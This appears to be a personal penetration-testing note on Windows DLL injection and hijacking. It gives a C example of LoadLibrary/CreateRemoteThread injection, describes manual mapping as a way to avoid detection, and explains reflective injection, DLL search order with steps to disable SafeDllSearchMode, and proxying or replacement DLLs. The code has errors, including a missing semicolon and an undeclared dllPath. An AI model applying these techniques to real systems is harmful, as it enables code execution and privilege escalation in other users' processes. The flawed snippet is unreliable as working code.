---
tags: [privesc, windows, dll-injection]
aliases: [DLL Injection]
---
Method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL) into a running process, effectively running code in the process's context.

# LoadLibrary 

Is a function provided by the Windows operating system that loads a DLL into the current process's memory and returns a handle that can be used to get the address of functions within the DLL.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}

```

Here we allocated memory within the target process for the DLL path and then initiated a remote connection thread that begins at LoadLibrary and directs towards the DLL path.
# Manual Mapping

Here we do manual loading of a DLL into a process's memory and resolve its imports and relocations. Avoids the easy detection involved in the `LoadLibrary` function.

# Reflective DLL Injection

We use reflective programming to load a library from memory into a host process. The library is responsible for its loading process by implementing a minimal Portable Execution (PE) file loader. 

# DLL Hijacking

Exploitation technique where an attacker capitalizes on the DLL loading process. DLLs can be loaded during runtime, creating an opportunity for hijacking if an application doesn't specify the full path to a require DLL. The default search order depends on `Safe DLL Search Mode` activation. When enabled the user's current directory is positioned further down the search order. This can be disabled with

- Press `Windows key + R` to open the Run dialog box.
- Type in `Regedit` and press `Enter`. This will open the Registry Editor.
- Navigate to `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`.
- In the right pane, look for the `SafeDllSearchMode` value. If it does not exist, right-click the blank space of the folder or right-click the `Session Manager` folder, select `New` and then `DWORD (32-bit) Value`. Name this new value as `SafeDllSearchMode`.
- Double-click `SafeDllSearchMode`. In the Value data field, enter `1` to enable and `0` to disable Safe DLL Search Mode.
- Click `OK`, close the Registry Editor and Reboot the system for the changes to take effect.

With this mode enabled, applications search for necessary DLL files in the following sequence:

1. The directory from which the application is loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

1. The directory from which the application is loaded.
2. The current directory.
3. The system directory.
4. The 16-bit system directory.
5. The Windows directory
6. The directories that are listed in the PATH environment variable

Then we need to pinpoint a DLL the target is attempting to locate, we can use 
- Process Explorer to see running processes loaded DLLs. 
- PE Explorer to reveal the DLLs from which the file imports functionality.

Once we identified one we need to modify the functions using reverse engineering tools. 

## Proxying

Involves creating a new library that will load the function we targeted, tamper with it and then return it to the program.

## Invalid Libraries

Involves replacing a valid library the program is attempting to load but cannot find with a crafted library.

## Related

- [[windows]]
- [[user-interaction]]
- [[local|Local File Inclusion]]
- [[web-and-code-methods]]

